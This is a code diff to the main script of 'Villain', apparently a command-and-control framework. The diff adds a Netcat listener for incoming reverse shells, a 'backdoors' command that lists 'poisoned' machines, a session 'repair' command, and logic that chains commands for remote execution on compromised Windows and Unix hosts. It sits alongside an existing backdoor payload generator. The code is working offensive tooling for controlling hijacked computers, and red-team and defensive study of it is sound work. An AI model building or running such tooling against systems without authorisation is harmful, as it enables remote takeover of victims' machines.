@@ -9,8 +9,7 @@
 import argparse
 from subprocess import check_output
 from Core.common import *
-from Core.settings import Hoaxshell_settings, Core_server_settings
-from string import ascii_uppercase, ascii_lowercase, digits
+from Core.settings import Hoaxshell_settings, Core_server_settings, Netcat_settings
 
 
 # -------------- Arguments -------------- #
@@ -18,6 +17,7 @@ parser = argparse.ArgumentParser()
 
 parser.add_argument("-p", "--port", action="store", help = "Core server port (default: 65001).", type = int)
 parser.add_argument("-x", "--hoax-port", action="store", help = "HoaxShell server port (default: 8080 via http, 443 via https).", type = int)
+parser.add_argument("-n", "--netcat-port", action="store", help = "Netcat multi-listener port (default: 4443).", type = int)
 parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for HoaxShell https server).")
 parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for HoaxShell https server).")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
@@ -34,8 +34,23 @@ if Hoaxshell_settings.ssl_support:
 	Hoaxshell_settings.bind_port_ssl = args.hoax_port if args.hoax_port else Hoaxshell_settings.bind_port_ssl
 	
 Core_server_settings.bind_port = args.port if args.port else Core_server_settings.bind_port
+Netcat_settings.bind_port = args.netcat_port if args.netcat_port else Netcat_settings.bind_port
 
-from Core.villain_core import Payload_generator, initiate_hoax_server, Sessions_manager, Hoaxshell, Core_server
+
+# Check if there are port number conflicts
+defined_ports = [Core_server_settings.bind_port, Netcat_settings.bind_port]
+
+if Hoaxshell_settings.ssl_support:
+	defined_ports.append(Hoaxshell_settings.bind_port_ssl)
+else:
+	defined_ports.append(Hoaxshell_settings.bind_port)
+
+if check_list_for_duplicates(defined_ports):
+	exit(f'[{DEBUG}] The port number of each server/listener must be different.')
+
+
+
+from Core.villain_core import Payload_generator, initiate_hoax_server, Sessions_manager, Hoaxshell, Core_server, Netcat_multi_listener
 
 
 # -------------- Functions & Classes -------------- #
@@ -117,7 +132,7 @@ class PrompHelp:
 
 		'exec' : {
 			'details' : f''' 			
-			\r  Execute command or file against an active shell session. 
+			\r  Execute command or file against an active backdoor session. 
 				
 			\r  {ORANGE}exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>{END}
 			
@@ -127,6 +142,18 @@ class PrompHelp:
 			'max_args' : 2
 		},			
 
+
+		'repair' : {
+			'details' : f''' 			
+			\r  Use this command to manually correct a session's hostname/username info
+			\r  in case Villain does not interpret the information correctly when a
+			\r  backdoor session is established.
+				
+			\r  {ORANGE}repair <SESSION ID> <HOSTNAME or USERNAME> <NEW VALUE>{END}
+			''',
+			'least_args' : 3,
+			'max_args' : 3
+		},	
 			
 		'shell' : {
 			'details' : f''' 			
@@ -196,6 +223,14 @@ class PrompHelp:
 			'max_args' : 0
 		},
 
+		'backdoors' : {
+			'details' : f'''
+			\r  Shell and listener types of backdoored machines that you have succesfully poisoned.
+			''',
+			'least_args' : 0,
+			'max_args' : 0
+		},
+
 		'id' : {
 			'details' : f'''
 			\r  Print server's unique ID.
@@ -230,19 +265,21 @@ class PrompHelp:
 		f'''
 		\r  Command          Description
 		\r  -------          -----------
-		\r  help     [+]     Print this message.
-		\r  connect  [+]     Connect with sibling server.
-		\r  generate [+]     Generates backdoor payload.
-		\r  siblings         Print sibling servers data table.
-		\r  sessions         Print established backdoor sessions data table.
-		\r  exec     [+]     Execute command/file against session.
-		\r  shell    [+]     Enable interactive hoaxshell for backdoor session.
-		\r  alias    [+]     Set an alias for a shell session.
-		\r  reset    [+]     Reset alias back to session ID.
-		\r  kill     [+]     Terminate an established backdoor session.
-		\r  id               Print server's unique ID (Self).
-		\r  clear            Clear screen.
-		\r  exit             Kill all sessions and quit.
+		\r  help      [+]     Print this message.
+		\r  connect   [+]     Connect with sibling server.
+		\r  generate  [+]     Generates backdoor payload.
+		\r  siblings          Print sibling servers data table.
+		\r  sessions          Print established backdoor sessions data table.
+		\r  backdoors         Print established backdoor types data table.
+		\r  exec      [+]     Execute command/file against a session.
+		\r  shell     [+]     Enable interactive hoaxshell for backdoor session.
+		\r  alias     [+]     Set an alias for a shell session.
+		\r  reset     [+]     Reset alias back to the session's unique ID.
+		\r  kill      [+]     Terminate an established backdoor session.
+		\r  repair    [+]     Manually correct a session's hostname/username info.
+		\r  id                Print server's unique ID (Self).
+		\r  clear             Clear screen.
+		\r  exit              Kill all sessions and quit.
 		
         \r  Commands with [+] may require additional arguments.
         \r  For details use: {ORANGE}help <COMMAND>{END}
@@ -399,7 +436,7 @@ class Completer(object):
 		
 		
 		# Autocomplete session IDs
-		elif (lb_list[0].lower() in ['exec', 'alias', 'kill', 'shell']) and (lb_list_len > 1) and (lb_list[-1][0] != "/"):
+		elif (lb_list[0].lower() in ['exec', 'alias', 'kill', 'shell', 'repair']) and (lb_list_len > 1) and (lb_list[-1][0] != "/"):
 			
 			if lb_list[-1] in Sessions_manager.active_sessions.keys():
 				pass
@@ -464,7 +501,7 @@ class Completer(object):
 		# Reset tab counter after 0.5s of inactivity
 		Thread(name="reset_counter", target=self.reset_counter).start()
 		return
-		
+
 
 	
 def main():
@@ -521,11 +558,35 @@ def main():
 			
 	else:
 		sys.exit(1)
+
+
+	''' Init Netcat '''
+	netcat = Netcat_multi_listener()
+	nc_multi_listener = Thread(target = netcat.initiate_nc_listener, args = ())
+	nc_multi_listener.daemon = True
+	nc_multi_listener.start()
+
+	# Wait for the Netcat multi listener socket to be established
+	timeout_start = time()
+
+	while time() < (timeout_start + 5):
+
+		if netcat.listener_initialized:													
+			break
+		
+		elif netcat.listener_initialized == False:			
+			sys.exit(1)
+			
+	else:
+		sys.exit(1)
 	
+	
+	''' Init Hoaxshell Engine '''
 	initiate_hoax_server()
 	payload_engine = Payload_generator()
 	sessions_manager = Sessions_manager()
 	Hoaxshell.server_unique_id = core.return_server_uniq_id()
+
 		
 	''' Start tab autoComplete '''
 	comp = Completer()
@@ -622,6 +683,7 @@ def main():
 						try:
 
 							Main_prompt.main_prompt_ready = False
+							Main_prompt.exec_active = True
 							command = cmd_list[1]
 							session_id = cmd_list[2]
 							src_is_file = False
@@ -659,9 +721,21 @@ def main():
 								Hoaxshell.command_pool[session_id].append(command)
 							
 							else:
-								command = command + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
+								
+								if Sessions_manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
+									command += "&echo '{" + core.SERVER_UNIQUE_ID + "}'"
+																
+								elif Sessions_manager.active_sessions[session_id]['Shell'] == 'unix':
+									command += "&&echo '{" + core.SERVER_UNIQUE_ID + "}'"
+								
+								else:
+									command += ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
+								
 								core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)
 							
+							# Reset prompt if session status is Undefined or Lost 
+							if Sessions_manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:
+								Main_prompt.main_prompt_ready = True
 							
 						except KeyboardInterrupt:
 							continue
@@ -741,6 +815,36 @@ def main():
 
 
 
+				elif cmd == 'repair':
+					sessions = Sessions_manager.active_sessions.keys()
+					
+					if len(sessions):
+						
+						if cmd_list[1] in sessions:
+							
+							key = cmd_list[2].lower().strip()
+							
+							if key in ['hostname', 'username']:
+								
+								result = sessions_manager.repair(cmd_list[1], key, cmd_list[3])
+								
+								if isinstance(result, list):
+									print(result[0])
+									
+								elif result == 0:
+									print('Success.')
+								
+							else:
+								print(f'Repair function not applicable on "{key}". Try HOSTNAME or USERNAME.')
+									
+						else:
+							print('Invalid session ID.')
+
+					else:
+						print(f'\rNo active sessions.')							
+
+
+
 				elif cmd == 'reset':
 										
 					sid = Sessions_manager.alias_to_session_id(cmd_list[1])
@@ -770,9 +874,18 @@ def main():
 
 				elif cmd == 'sessions':
 
-					if cmd_list_len == 1:
-											
+					if cmd_list_len == 1:							
 						sessions_manager.list_sessions()
+								
+					else:
+						print('Unsupported arguments.')
+
+
+
+				elif cmd == 'backdoors':
+
+					if cmd_list_len == 1:											
+						sessions_manager.list_backdoors()
 								
 					else:
 						print('Unsupported arguments.')
@@ -788,6 +901,13 @@ def main():
 		
 		
 		except KeyboardInterrupt:
+			
+			Main_prompt.main_prompt_ready = True
+			
+			if Main_prompt.exec_active:
+				Main_prompt.exec_active = False
+				print('\r')
+				continue
 			
 			verified = True
 			
